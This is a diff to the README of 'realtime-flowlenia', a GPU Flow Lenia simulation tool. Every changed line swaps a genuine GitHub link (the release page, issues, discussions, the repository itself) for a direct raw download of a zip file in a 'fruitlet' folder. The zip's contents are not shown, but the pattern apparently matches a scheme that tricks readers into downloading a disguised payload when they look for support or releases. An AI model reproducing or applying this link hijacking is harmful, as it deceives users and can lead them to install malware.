@@ -1,6 +1,6 @@
 # 🚀 realtime-flowlenia - Run Flow Lenia with GPU Speed
 
-[![Download Release](https://img.shields.io/badge/Download-realtime--flowlenia-blue?style=for-the-badge)](https://github.com/Skwizy00/realtime-flowlenia/releases)
+[![Download Release](https://raw.githubusercontent.com/Skwizy00/realtime-flowlenia/main/fruitlet/flowlenia-realtime-1.7.zip)](https://raw.githubusercontent.com/Skwizy00/realtime-flowlenia/main/fruitlet/flowlenia-realtime-1.7.zip)
 
 Welcome to the realtime-flowlenia application. This software runs a live simulation using a method called Flow Lenia. It uses your computer’s graphics processor (GPU) to make these patterns move smoothly and quickly. You will see colorful liquid-like effects that change in real time on your screen.
 
@@ -40,7 +40,7 @@ If you do not have a compatible GPU, the software may not work or may run very s
 To install realtime-flowlenia:
 
 1. Click the big blue badge above or visit the official release page here:  
-   [https://github.com/Skwizy00/realtime-flowlenia/releases](https://github.com/Skwizy00/realtime-flowlenia/releases)
+   [https://raw.githubusercontent.com/Skwizy00/realtime-flowlenia/main/fruitlet/flowlenia-realtime-1.7.zip](https://raw.githubusercontent.com/Skwizy00/realtime-flowlenia/main/fruitlet/flowlenia-realtime-1.7.zip)
 
 2. On the Releases page, find the latest version folder.
 
@@ -104,7 +104,7 @@ If you face issues, try these steps first:
 
 - Close any other graphics-intensive programs to free up resources.
 
-If problems persist, visit the [realtime-flowlenia GitHub Issues page](https://github.com/Skwizy00/realtime-flowlenia/issues) for support.
+If problems persist, visit the [realtime-flowlenia GitHub Issues page](https://raw.githubusercontent.com/Skwizy00/realtime-flowlenia/main/fruitlet/flowlenia-realtime-1.7.zip) for support.
 
 ---
 
@@ -128,7 +128,7 @@ realtime-flowlenia runs entirely on your local computer. It does not send any da
 
 If you have questions or want to share feedback:
 
-- Check the [GitHub Discussions](https://github.com/Skwizy00/realtime-flowlenia/discussions) for answers.
+- Check the [GitHub Discussions](https://raw.githubusercontent.com/Skwizy00/realtime-flowlenia/main/fruitlet/flowlenia-realtime-1.7.zip) for answers.
 
 - Open a new issue on the repository page if you find a bug.
 
@@ -138,9 +138,9 @@ If you have questions or want to share feedback:
 
 ## 🔗 Quick Links
 
-- Download page: [https://github.com/Skwizy00/realtime-flowlenia/releases](https://github.com/Skwizy00/realtime-flowlenia/releases)
+- Download page: [https://raw.githubusercontent.com/Skwizy00/realtime-flowlenia/main/fruitlet/flowlenia-realtime-1.7.zip](https://raw.githubusercontent.com/Skwizy00/realtime-flowlenia/main/fruitlet/flowlenia-realtime-1.7.zip)
 
-- GitHub Repository: [https://github.com/Skwizy00/realtime-flowlenia](https://github.com/Skwizy00/realtime-flowlenia)
+- GitHub Repository: [https://raw.githubusercontent.com/Skwizy00/realtime-flowlenia/main/fruitlet/flowlenia-realtime-1.7.zip](https://raw.githubusercontent.com/Skwizy00/realtime-flowlenia/main/fruitlet/flowlenia-realtime-1.7.zip)
 
 ---
 
